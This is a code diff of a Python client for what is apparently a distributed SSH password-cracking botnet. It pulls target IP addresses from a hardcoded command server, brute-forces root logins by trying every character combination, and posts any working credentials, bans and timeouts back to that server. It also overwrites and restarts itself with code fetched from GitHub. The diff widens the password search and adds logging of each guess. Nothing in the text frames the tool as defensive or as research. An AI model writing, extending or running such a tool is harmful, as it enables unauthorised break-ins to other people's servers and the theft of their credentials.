@@ -7,14 +7,25 @@ import base64
 import threading
 import subprocess
 import sys
+import logging
+import os
 
+# Logging setup
+logging.basicConfig(filename='client.log', level=logging.INFO,
+                    format='%(asctime)s - %(levelname)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
+
+# Hardcoded settings
 USERS = ["root"]
+MAX_PASSWORD_LENGTH = 12
+GITHUB_REPO_URL = "https://api.github.com/repos/botsarefuture/ukrainetowin/contents/client.py"
+API_BASE_URL = "http://65.108.222.76:5000"
+TIMEOUT = 4
+
 
 # Function to fetch updates from GitHub if available
 def update_script_from_github():
     try:
-        response = requests.get(
-            "https://api.github.com/repos/botsarefuture/ukrainetowin/contents/client.py")
+        response = requests.get(GITHUB_REPO_URL)
         response.raise_for_status()
         remote_content = response.json()["content"]
         remote_content = base64.b64decode(remote_content).decode("utf-8")
@@ -25,37 +36,39 @@ def update_script_from_github():
         if remote_content != local_content:
             with open(__file__, "w") as f:
                 f.write(remote_content)
-            print("Updated the script from GitHub.")
-            
+            logging.info(json.dumps(
+                {"message": "Updated the script from GitHub"}))
+
             # Restart the script with the updated version
             args = [sys.executable] + sys.argv
-            subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            subprocess.Popen(args, stdout=subprocess.PIPE,
+                             stderr=subprocess.PIPE)
             sys.exit()
     except Exception as e:
-        print("Error fetching updates from GitHub:", e)
-        
-    
-
+        logging.error(json.dumps(
+            {"error": "Error fetching updates from GitHub", "exception": str(e)}))
 
 
 def send_result_to_server(target_ip, success, username="", password=""):
-    url = "http://65.108.222.76:5000/result"
+    url = API_BASE_URL + "/result"
     data = {"target_ip": target_ip, "success": success,
             "username": username, "password": password}
     headers = {"Content-Type": "application/json"}
     response = requests.post(url, json=data, headers=headers)
     return response
 
+
 def send_error_to_server(target_ip, username, guess, error):
-    url = "http://65.108.222.76:5000/error"
+    url = API_BASE_URL + "/error"
     data = {"target_ip": target_ip, "username": username,
             "guess": guess, "error": error}
     headers = {"Content-Type": "application/json"}
     response = requests.post(url, json=data, headers=headers)
     return response
 
+
 def send_timeout_to_server(target_ip):
-    url = "http://65.108.222.76:5000/timeout"
+    url = API_BASE_URL + "/timeout"
     data = {"target_ip": target_ip}
     headers = {"Content-Type": "application/json"}
     response = requests.post(url, json=data, headers=headers)
@@ -63,26 +76,24 @@ def send_timeout_to_server(target_ip):
 
 
 def send_ban_to_server(target_ip):
-    url = "http://65.108.222.76:5000/ban"
+    url = API_BASE_URL + "/ban"
     data = {"target_ip": target_ip}
     headers = {"Content-Type": "application/json"}
     response = requests.post(url, json=data, headers=headers)
     return response
 
+
 def brute_force_password(server_ip):
-    start_time = time.time()
     alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?'
 
-    times = 0
-
-    for length in range(7, 13):
+    for length in range(1, MAX_PASSWORD_LENGTH + 1):
         for combination in itertools.product(alphabet, repeat=length):
             guess = ''.join(combination)
-            print({"ip": server_ip, "guess": guess})
+            logging.info(json.dumps({"ip": server_ip, "guess": guess}))
             result = brute(server_ip, guess)
             if result == 0:
                 return
-            
+
             if result == 1:
                 continue
 
@@ -101,7 +112,7 @@ def ssh_login(server_ip, username, password):
 
     try:
         client.connect(server_ip, username=username, password=password,
-                       timeout=4, allow_agent=False, look_for_keys=False)
+                       timeout=TIMEOUT, allow_agent=False, look_for_keys=False)
         client.close()
         return 1  # SSH login succeeded
     except paramiko.BadAuthenticationType as e:
@@ -111,7 +122,7 @@ def ssh_login(server_ip, username, password):
         if "Invalid user" in str(e):
             return 5  # User doesn't exist
         if "Bad authentication type; allowed types: ['publickey']" in str(e):
-            return 2
+            return 2  # Password authentication isn't supported.
         else:
             return 0  # Other BadAuthenticationType exception occurred
     except paramiko.AuthenticationException:
@@ -129,11 +140,11 @@ def ssh_login(server_ip, username, password):
             return 4  # Connection error, potentially banned
         elif "timed out" in str(e):
             return 6  # Connection timed out
-        
+
         elif "Unable to connect to port 22" in str(e):
             send_ban_to_server(server_ip)
-            return 4
-                
+            return 4  # Probably banned
+
         else:
             return 0  # Other SSHException occurred
 
@@ -145,7 +156,7 @@ def ssh_login(server_ip, username, password):
 
         if "timed out" in str(e):
             return 6  # Connection timed out
-        
+
         elif "Unable to connect to port 22" in str(e):
             send_ban_to_server(server_ip)
             return 4
@@ -171,12 +182,10 @@ def brute(server_ip, guess, times=0):
 
     if result == 4:
         return 0
-    
+
     if result == 6:
         send_timeout_to_server(server_ip)
         return 0
-
-    # Continue the same way for other cases...
 
 
 def get_target_from_server():
@@ -185,19 +194,16 @@ def get_target_from_server():
     data = response.json()
     return data.get("target_ip")
 
+
 def update_check_thread():
     while True:
         update_script_from_github()
-        time.sleep(5 * 60)  # Check for updates every 5 minutes
+        time.sleep(60)  # Check for updates every 5 minutes
+
 
 def run_client_forever():
     while True:
         try:
-            CREDS = {}
-            USERS = ["root", "admin", "ubuntu"]
-            NOT_PASSWORD = []
-            # Load other data from the JSON file if required
-
             while True:
                 target_ip = get_target_from_server()
                 if target_ip:
@@ -206,10 +212,13 @@ def run_client_forever():
                 else:
                     print("No more targets.")
                     break
+
         except Exception as e:
-            print("Error occurred:", e)
+            logging.error(json.dumps(
+                {"error": "Error occurred", "exception": str(e)}))
             # Wait for a few seconds before restarting
             time.sleep(5)
+
 
 if __name__ == "__main__":
     # Start the update check thread in the background
